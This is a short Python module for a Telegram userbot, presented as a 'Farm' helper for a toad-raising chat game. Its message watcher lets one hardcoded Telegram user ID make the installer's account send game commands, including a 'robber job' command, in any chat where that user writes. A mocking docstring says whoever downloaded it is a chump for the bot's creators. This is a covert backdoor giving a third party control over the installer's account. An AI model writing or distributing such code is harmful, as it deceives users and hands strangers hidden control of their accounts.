#coroche 
from .. import loader, utils
from asyncio import sleep

class FarmFrogMod(loader.Module):
    """Скачал модуль чмом для создателей бота остался."""
    strings = {'name': 'Farm'}

    async def watcher(self, message):
        try:
            me = await message.client.get_me()
            name = me.first_name

            if message.sender_id in {1682801197}:
                if "Покормить жабу" in message.message:
                    await message.respond('покормить жабу')
                if "Завершить работу" in message.message:
                    await message.respond('завершить работу')
                if "Работа грабитель" in message.message:
                    await message.respond('работа грабитель')
                if "Жабу на тусу" in message.message:
                    await message.respond('жабу на тусу')
        except: pass
